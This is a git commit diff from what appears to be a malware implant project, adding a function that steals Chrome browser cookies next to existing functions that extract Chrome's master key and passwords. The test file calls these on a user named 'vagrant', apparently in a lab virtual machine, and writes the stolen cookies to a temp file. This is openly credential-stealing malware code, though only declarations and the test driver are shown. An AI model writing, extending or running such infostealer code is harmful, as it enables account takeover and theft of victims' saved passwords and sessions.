dba3c73c2dbf06475e669f5d0add585be489c606
myliang47 <mellaliang47@gmail.com>
2022-05-01 15:43:05 -0400

    loot cookies with write to file commented out

--- implant/loot/loot.hpp
+++ implant/loot/loot.hpp
@@ -10,6 +10,7 @@ const int MASTER_KEY_SIZE = 32;
 
 void getMasterKey(unsigned char* masterKey, std::string userName);
 json lootChromePasswords(const unsigned char* masterKey, std::string userName);
+void lootChromeCookies(const unsigned char* masterKey, std::string userName, char* writePath);
 
 // Utilities
 void printUCharAsHex(unsigned char* uChar, int len);
--- implant/tests/test_loot.cpp
+++ implant/tests/test_loot.cpp
@@ -1,14 +1,20 @@
 #include <iostream>
 #include "../loot/loot.hpp"
 
+using namespace std;
+
 int main() {
 	unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];
 
 	getMasterKey(masterKey, "vagrant");
 	printUCharAsHex(masterKey, MASTER_KEY_SIZE);
 
-	json jsonResult = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
-	std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
+	// json passwords = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
+	// std::cout << "passwords: " << passwords.dump(4) << std::endl;
+
+	char writePath[] = "C:\\Users\\vagrant\\AppData\\Local\\Temp\\cookies.txt";
+	lootChromeCookies((const unsigned char*) masterKey, "vagrant", writePath);
+	// cout << "cookies: " << cookies.dump(4) << endl;
 
 	delete[] masterKey;
 	return 0;
